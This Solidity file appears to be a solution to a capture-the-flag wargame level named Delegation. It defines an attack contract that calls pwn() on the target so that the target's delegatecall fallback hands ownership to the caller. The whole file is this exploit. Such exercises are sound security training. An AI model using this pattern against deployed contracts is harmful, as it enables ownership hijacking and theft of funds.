// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Levels/Delegation.sol";

contract DelegationAttack {

  Delegation delegation = Delegation(0xe73bc5BD4763A3307AB5F8F126634b7E12E3dA9b);

  function take() public {
    (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
    require(success, "call not successful");
  }
}
